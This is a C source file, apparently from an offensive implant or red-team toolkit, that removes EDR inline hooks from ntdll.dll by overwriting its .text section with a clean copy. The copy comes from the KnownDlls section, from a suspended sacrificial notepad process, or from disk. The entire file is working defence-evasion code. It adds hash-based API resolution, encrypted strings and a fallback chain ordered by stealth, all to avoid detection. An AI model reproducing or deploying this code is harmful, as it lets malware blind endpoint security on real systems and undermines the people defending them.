#include "unhook.h"
#include "peb_types.h"
#include "api_resolve.h"
#include "strings_encrypt.h"

/*
 * ntdll.dll Unhooking Module
 *
 * EDRs inject a hook DLL into every process via KAPC during creation.
 * The hook DLL patches ntdll function prologues with JMP instructions
 * to redirect execution through its monitoring code.
 *
 * We restore the original .text section from a clean copy of ntdll,
 * effectively removing all inline hooks.
 */

// ntdll function typedefs
typedef NTSTATUS (NTAPI* fnNtOpenSection)(PHANDLE, ACCESS_MASK, PDN_OBJECT_ATTRIBUTES);
typedef NTSTATUS (NTAPI* fnNtMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
typedef NTSTATUS (NTAPI* fnNtUnmapViewOfSection)(HANDLE, PVOID);
typedef void (NTAPI* fnRtlInitUnicodeString)(PDN_UNICODE_STRING, PCWSTR);

// PE helpers
static PIMAGE_NT_HEADERS get_nt_headers(PVOID base) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    return (PIMAGE_NT_HEADERS)((BYTE*)base + dos->e_lfanew);
}

// Find .text section info
static BOOL get_text_section(PVOID base, DWORD* rva, DWORD* size) {
    PIMAGE_NT_HEADERS nt = get_nt_headers(base);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            *rva = sec[i].VirtualAddress;
            *size = sec[i].Misc.VirtualSize;
            return TRUE;
        }
    }
    return FALSE;
}

// Get ntdll base from PEB
static PVOID get_ntdll_base(void) {
    PDN_PEB peb = dn_get_peb();
    PLIST_ENTRY head = &peb->Ldr->InLoadOrderModuleList;
    PLIST_ENTRY entry = head->Flink->Flink;  // second = ntdll
    PDN_LDR_DATA_TABLE_ENTRY mod = CONTAINING_RECORD(entry, DN_LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
    return mod->DllBase;
}

// Overwrite the hooked .text with clean bytes
static BOOL overwrite_text_section(PVOID hooked_base, PVOID clean_base) {
    DWORD text_rva = 0, text_size = 0;
    if (!get_text_section(hooked_base, &text_rva, &text_size))
        return FALSE;

    BYTE* hooked_text = (BYTE*)hooked_base + text_rva;
    BYTE* clean_text  = (BYTE*)clean_base + text_rva;

    // make writable
    DWORD old_prot;
    if (!VirtualProtect(hooked_text, text_size, PAGE_EXECUTE_READWRITE, &old_prot))
        return FALSE;

    // copy clean bytes over hooked ones
    memcpy(hooked_text, clean_text, text_size);

    // restore original protection
    VirtualProtect(hooked_text, text_size, old_prot, &old_prot);

    return TRUE;
}

// -------------------------------------------------------------------
// Strategy 1: KnownDlls section mapping
// Stealthiest: no filesystem access, no process creation
// Opens \KnownDlls\ntdll.dll as a section object and maps it
// -------------------------------------------------------------------
BOOL dn_unhook_via_knowndlls(void) {
    HANDLE hSection = NULL;
    PVOID clean_base = NULL;
    BOOL result = FALSE;

    // resolve Nt* functions via PEB walk + CRC32B hash (zero IAT footprint)
    PVOID ntdll = dn_get_module_by_hash(HASH_NTDLL_DLL);
    if (!ntdll) return FALSE;

    // resolve all 4 functions by runtime hash of their names
    // (avoids hardcoded hashes that could drift if the CRC32B table changes)
    fnNtOpenSection pNtOpenSection = (fnNtOpenSection)dn_get_proc_by_hash(ntdll, dn_crc32b("NtOpenSection"));
    fnNtMapViewOfSection pNtMapViewOfSection = (fnNtMapViewOfSection)dn_get_proc_by_hash(ntdll, dn_crc32b("NtMapViewOfSection"));
    fnNtUnmapViewOfSection pNtUnmapViewOfSection = (fnNtUnmapViewOfSection)dn_get_proc_by_hash(ntdll, dn_crc32b("NtUnmapViewOfSection"));

    char rtl_buf[32];
    dn_decrypt_string(DN_STR_RTLINITUSTR, rtl_buf, sizeof(rtl_buf));
    fnRtlInitUnicodeString pRtlInitUnicodeString = (fnRtlInitUnicodeString)dn_get_proc_by_hash(ntdll, dn_crc32b(rtl_buf));
    SecureZeroMemory(rtl_buf, sizeof(rtl_buf));

    if (!pNtOpenSection || !pNtMapViewOfSection || !pNtUnmapViewOfSection || !pRtlInitUnicodeString)
        return FALSE;

    // open the KnownDlls section (decrypt path, convert to wide)
    wchar_t kd_buf[32];
    dn_decrypt_wstring(DN_STR_KNOWNDLLS, kd_buf, sizeof(kd_buf)/sizeof(wchar_t));
    DN_UNICODE_STRING section_name;
    pRtlInitUnicodeString(&section_name, kd_buf);

    DN_OBJECT_ATTRIBUTES oa;
    DN_InitializeObjectAttributes(&oa, &section_name, OBJ_CASE_INSENSITIVE, NULL, NULL);

    NTSTATUS status = pNtOpenSection(&hSection, SECTION_MAP_READ | SECTION_MAP_EXECUTE, &oa);
    SecureZeroMemory(kd_buf, sizeof(kd_buf));
    if (status != 0) return FALSE;

    // map the clean ntdll into our address space
    SIZE_T view_size = 0;
    status = pNtMapViewOfSection(hSection, GetCurrentProcess(), &clean_base, 0, 0,
                                  NULL, &view_size, 1 /* ViewShare */, 0, PAGE_READONLY);
    if (status != 0) {
        CloseHandle(hSection);
        return FALSE;
    }

    // overwrite hooked .text with clean copy
    PVOID hooked_ntdll = get_ntdll_base();
    result = overwrite_text_section(hooked_ntdll, clean_base);

    // cleanup
    pNtUnmapViewOfSection(GetCurrentProcess(), clean_base);
    CloseHandle(hSection);

    return result;
}

// -------------------------------------------------------------------
// Strategy 2: Suspended process
// Create a sacrificial process in SUSPENDED state,
// read its clean ntdll .text via ReadProcessMemory
// -------------------------------------------------------------------
BOOL dn_unhook_via_suspended_process(void) {
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    BOOL result = FALSE;

    // create a suspended notepad (harmless, always available)
    char np_buf[16];
    dn_decrypt_string(DN_STR_NOTEPAD, np_buf, sizeof(np_buf));
    if (!CreateProcessA(NULL, np_buf, NULL, NULL, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        SecureZeroMemory(np_buf, sizeof(np_buf));
        return FALSE;
    }
    SecureZeroMemory(np_buf, sizeof(np_buf));

    PVOID hooked_ntdll = get_ntdll_base();
    DWORD text_rva = 0, text_size = 0;
    if (!get_text_section(hooked_ntdll, &text_rva, &text_size)) {
        goto cleanup;
    }

    // the suspended process has the same ntdll base address (ASLR per-boot, not per-process)
    BYTE* clean_text = (BYTE*)HeapAlloc(GetProcessHeap(), 0, text_size);
    if (!clean_text) goto cleanup;

    SIZE_T bytes_read = 0;
    BYTE* remote_text = (BYTE*)hooked_ntdll + text_rva;
    if (!ReadProcessMemory(pi.hProcess, remote_text, clean_text, text_size, &bytes_read)) {
        HeapFree(GetProcessHeap(), 0, clean_text);
        goto cleanup;
    }

    // overwrite our hooked .text
    DWORD old_prot;
    BYTE* local_text = (BYTE*)hooked_ntdll + text_rva;
    if (VirtualProtect(local_text, text_size, PAGE_EXECUTE_READWRITE, &old_prot)) {
        memcpy(local_text, clean_text, text_size);
        VirtualProtect(local_text, text_size, old_prot, &old_prot);
        result = TRUE;
    }

    HeapFree(GetProcessHeap(), 0, clean_text);

cleanup:
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return result;
}

// -------------------------------------------------------------------
// Strategy 3: Disk read (fallback)
// Open ntdll.dll from System32, map it, replace .text
// Triggers filesystem minifilter but always works
// -------------------------------------------------------------------
BOOL dn_unhook_via_disk(void) {
    BOOL result = FALSE;

    // build path from encrypted components
    char sys_path[MAX_PATH];
    dn_decrypt_string(DN_STR_SYSTEM32, sys_path, sizeof(sys_path));
    char dll_name[16];
    dn_decrypt_string(DN_STR_NTDLL, dll_name, sizeof(dll_name));
    char path[MAX_PATH];
    snprintf(path, sizeof(path), "%s%s.dll", sys_path, dll_name);
    SecureZeroMemory(sys_path, sizeof(sys_path));
    SecureZeroMemory(dll_name, sizeof(dll_name));

    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMapping) {
        CloseHandle(hFile);
        return FALSE;
    }

    PVOID clean_base = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!clean_base) {
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return FALSE;
    }

    // overwrite hooked .text with clean disk copy
    PVOID hooked_ntdll = get_ntdll_base();
    result = overwrite_text_section(hooked_ntdll, clean_base);

    UnmapViewOfFile(clean_base);
    CloseHandle(hMapping);
    CloseHandle(hFile);

    return result;
}

// -------------------------------------------------------------------
// Main unhooking entry point
// Tries strategies in order of stealth, falls back on failure
// -------------------------------------------------------------------
BOOL dn_unhook_ntdll(void) {
    // try KnownDlls first (stealthiest)
    if (dn_unhook_via_knowndlls()) return TRUE;

    // try suspended process (no file I/O)
    if (dn_unhook_via_suspended_process()) return TRUE;

    // last resort: disk read
    return dn_unhook_via_disk();
}
